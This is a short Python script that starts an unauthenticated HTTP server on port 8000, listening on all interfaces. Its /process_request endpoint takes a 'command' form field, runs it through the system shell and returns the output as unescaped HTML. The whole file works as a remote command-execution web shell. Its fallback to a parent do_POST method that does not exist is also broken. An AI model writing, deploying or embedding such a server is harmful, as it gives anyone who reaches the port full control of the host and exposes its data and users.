
import http.server
import socketserver
import cgi
import subprocess
import os

PORT = 8000

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/process_request':
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD':'POST',
                         'CONTENT_TYPE':self.headers['Content-Type'],
                         })


            command_to_execute = form.getvalue("command")

            if command_to_execute:
                try:
                    result = subprocess.check_output(command_to_execute, shell=True, stderr=subprocess.STDOUT)
                    output = result.decode('utf-8')
                except subprocess.CalledProcessError as e:
                    output = "Error: " + e.output.decode('utf-8')

                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(bytes(f"Command executed:<br><pre>{command_to_execute}</pre><br>Output:<br><pre>{output}</pre>", "utf8"))

            else:
                self.send_response(400)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(bytes("No command provided.", "utf8"))
        else:
            super().do_POST()


Handler = MyHandler

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print("serving at port", PORT)
    httpd.serve_forever()






